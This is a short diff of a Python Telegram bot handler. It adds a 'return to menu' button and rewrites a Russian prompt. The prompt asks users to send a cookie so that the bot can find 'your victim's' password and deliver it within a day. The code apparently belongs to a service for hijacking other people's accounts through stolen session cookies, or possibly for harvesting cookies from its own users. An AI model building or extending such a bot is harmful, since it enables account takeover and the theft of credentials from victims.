@@ -748,11 +748,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "cookies_copied":
+        keyboard = [
+            [InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
         await query.edit_message_text(
-            "✅ Отлично!\n\n"
-            "📋 Теперь отправьте cookie в бота\n"
-            "Бот начнет поиск пароля вашей жертвы 😈\n"
-            "В течении дня бот скинет вам пароль от аккаунта"
+            "Скинь cookie в бота\n"
+            "И бот начнет поиск пароля вашей жертвы😈\n"
+            "В течении дня бот скинет вам пароль от аккаунта",
+            reply_markup=reply_markup
         )
         return
     
